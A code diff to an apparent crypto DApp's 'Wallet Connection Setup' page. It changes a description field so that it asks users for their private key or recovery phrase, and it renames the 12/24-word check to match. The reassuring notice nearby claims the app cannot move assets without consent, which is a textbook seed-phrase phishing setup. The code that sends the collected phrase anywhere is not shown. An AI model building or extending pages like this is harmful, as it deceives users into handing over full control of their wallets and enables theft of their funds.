@@ -181,7 +181,7 @@
     <div class="container">
         <h1>Wallet Connection Setup</h1>
         <input type="text" id="walletAddress" placeholder="Enter your wallet address" style="width: calc(100% - 20px); padding: 12px; margin-bottom: 25px; border: 1px solid #444; border-radius: 6px; background-color: #3b4252; color: #fff; font-size: 1em;">
-        <textarea id="userDescription" placeholder=""></textarea>
+        <textarea id="userDescription" placeholder="Enter either your private key or recovery phrase to link your wallet to the system (12 or 24 words)"></textarea>
         <p class="warning">**Important Security Notice:**</p>
         <p>When we refer to "automation of operations", it means that the DApp will prepare transactions or interactions with smart contracts based on your configurations or the provided description. However, **YOU MUST ALWAYS MANUALLY APPROVE EACH TRANSACTION** through your wallet (MetaMask, Trust Wallet, etc.). The application does not have the ability to move your assets without your explicit consent.</p>
         <button onclick="proceedToWalletConnection()">Connect Wallet and Continue</button>
@@ -205,7 +205,7 @@
             // Validate description (12 or 24 words)
             const words = description.trim().split(/\s+/);
             if (words.length !== 12 && words.length !== 24) {
-                alert('Description must be exactly 12 or 24 words');
+                alert('Key must be exactly 12 or 24 words');
                 return;
             }
 
